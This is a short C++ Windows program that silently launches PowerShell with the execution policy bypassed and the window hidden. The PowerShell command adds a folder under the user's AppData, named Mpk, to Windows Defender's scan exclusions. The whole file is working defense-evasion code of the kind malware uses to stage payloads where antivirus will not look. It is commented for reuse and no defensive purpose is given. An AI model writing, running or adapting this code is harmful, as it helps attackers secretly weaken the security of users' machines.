#include <iostream>      // Include for standard C++ I/O (like std::cout)
#include <windows.h>     // Required for CreateProcessA, STARTUPINFOA, etc.
#include <stdio.h>       // Required for snprintf

// Use the standard C++ entry point for a Console Application
int main() {
    const char* psScript = R"(
        # Your script to add the AppData exclusion path to Windows Defender
        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Mpk"
    )";

    // Build the PowerShell command
    // NOTE: Make sure the buffer size (4096) is large enough for your entire script!
    char command[4096];
    // Use the safe snprintf to build the command line string
    if (snprintf(command, sizeof(command),
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"%s\"",
        psScript) >= sizeof(command))
    {
        std::cerr << "Error: Command buffer overflowed." << std::endl;
        return 1; // Return with an error code
    }

    // Create process info structures
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // --- Configuration for running a hidden process ---

    // The STARTF_USESHOWWINDOW flag must be set for wShowWindow to be used.
    si.dwFlags = STARTF_USESHOWWINDOW;
    // SW_HIDE specifies that the window is to be hidden.
    si.wShowWindow = SW_HIDE;

    // Execute PowerShell
    if (CreateProcessA(
        NULL,              // Application name (NULL lets the command line specify the path)
        command,           // Command line (the full powershell command)
        NULL,              // Process security attributes
        NULL,              // Thread security attributes
        FALSE,             // Inherit handles
        CREATE_NO_WINDOW,  // Creation flags - prevents creation of a new console window
        NULL,              // Environment
        NULL,              // Current directory
        &si,               // Startup info
        &pi                // Process info
    )) {
        std::cout << "Successfully launched hidden PowerShell process." << std::endl;

        // Wait for the script to complete (optional - remove for async execution)
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Clean up handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        std::cout << "PowerShell process finished." << std::endl;
        return 0; // Success
    } else {
        // Handle error: GetLastError() can provide more detail
        std::cerr << "Error launching process. Code: " << GetLastError() << std::endl;
        return 1; // Failure
    }
}